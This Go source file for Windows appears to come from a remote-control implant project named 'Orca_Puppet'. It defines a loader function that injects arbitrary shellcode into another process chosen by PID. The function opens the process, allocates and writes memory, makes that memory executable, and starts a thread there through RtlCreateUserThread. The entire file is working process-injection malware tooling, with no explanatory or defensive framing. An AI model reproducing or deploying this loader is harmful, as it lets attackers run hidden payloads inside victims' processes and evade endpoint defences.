//go:build windows
// +build windows

package loader

import (
	"Orca_Puppet/define/colorcode"
	"fmt"
	"golang.org/x/sys/windows"
	"unsafe"
)

func RunRtlCreateUserThread(shellcode []byte, pid int) string {
	stdErr := ""
	kernel32 := windows.NewLazySystemDLL("kernel32.dll")
	ntdll := windows.NewLazySystemDLL("ntdll.dll")

	OpenProcess := kernel32.NewProc("OpenProcess")
	VirtualAllocEx := kernel32.NewProc("VirtualAllocEx")
	VirtualProtectEx := kernel32.NewProc("VirtualProtectEx")
	WriteProcessMemory := kernel32.NewProc("WriteProcessMemory")
	RtlCreateUserThread := ntdll.NewProc("RtlCreateUserThread")
	CloseHandle := kernel32.NewProc("CloseHandle")

	pHandle, _, errOpenProcess := OpenProcess.Call(windows.PROCESS_CREATE_THREAD|windows.PROCESS_VM_OPERATION|windows.PROCESS_VM_WRITE|windows.PROCESS_VM_READ|windows.PROCESS_QUERY_INFORMATION, 0, uintptr(uint32(pid)))
	if errOpenProcess != nil && errOpenProcess.Error() != "The operation completed successfully." {
		message := fmt.Sprintf("[!]Error calling OpenProcess:\r\n%s", errOpenProcess.Error())
		stdErr = colorcode.OutputMessage(colorcode.SIGN_FAIL, message)
		return stdErr
	}

	addr, _, errVirtualAlloc := VirtualAllocEx.Call(uintptr(pHandle), 0, uintptr(len(shellcode)), windows.MEM_COMMIT|windows.MEM_RESERVE, windows.PAGE_READWRITE)
	if errVirtualAlloc != nil && errVirtualAlloc.Error() != "The operation completed successfully." {
		message := fmt.Sprintf("[!]Error calling VirtualAlloc:\r\n%s", errVirtualAlloc.Error())
		stdErr = colorcode.OutputMessage(colorcode.SIGN_FAIL, message)
		return stdErr
	}
	_, _, errWriteProcessMemory := WriteProcessMemory.Call(uintptr(pHandle), addr, (uintptr)(unsafe.Pointer(&shellcode[0])), uintptr(len(shellcode)))
	if errWriteProcessMemory != nil && errWriteProcessMemory.Error() != "The operation completed successfully." {
		message := fmt.Sprintf("[!]Error calling WriteProcessMemory:\r\n%s", errWriteProcessMemory.Error())
		stdErr = colorcode.OutputMessage(colorcode.SIGN_FAIL, message)
		return stdErr
	}

	oldProtect := windows.PAGE_READWRITE
	_, _, errVirtualProtectEx := VirtualProtectEx.Call(uintptr(pHandle), addr, uintptr(len(shellcode)), windows.PAGE_EXECUTE_READ, uintptr(unsafe.Pointer(&oldProtect)))
	if errVirtualProtectEx != nil && errVirtualProtectEx.Error() != "The operation completed successfully." {
		message := fmt.Sprintf("Error calling VirtualProtectEx:\r\n%s", errVirtualProtectEx.Error())
		stdErr = colorcode.OutputMessage(colorcode.SIGN_FAIL, message)
		return stdErr
	}

	var tHandle uintptr
	_, _, errRtlCreateUserThread := RtlCreateUserThread.Call(uintptr(pHandle), 0, 0, 0, 0, 0, addr, 0, uintptr(unsafe.Pointer(&tHandle)), 0)
	if errRtlCreateUserThread != nil && errRtlCreateUserThread.Error() != "The operation completed successfully." {
		message := fmt.Sprintf("Error calling RtlCreateUserThread:\r\n%s", errRtlCreateUserThread.Error())
		stdErr = colorcode.OutputMessage(colorcode.SIGN_FAIL, message)
		return stdErr
	}

	_, _, errCloseHandle := CloseHandle.Call(uintptr(uint32(pHandle)))
	if errCloseHandle != nil && errCloseHandle.Error() != "The operation completed successfully." {
		message := fmt.Sprintf("[!]Error calling CloseHandle:\r\n%s", errCloseHandle.Error())
		stdErr = colorcode.OutputMessage(colorcode.SIGN_FAIL, message)
		return stdErr
	}

	return ""
}
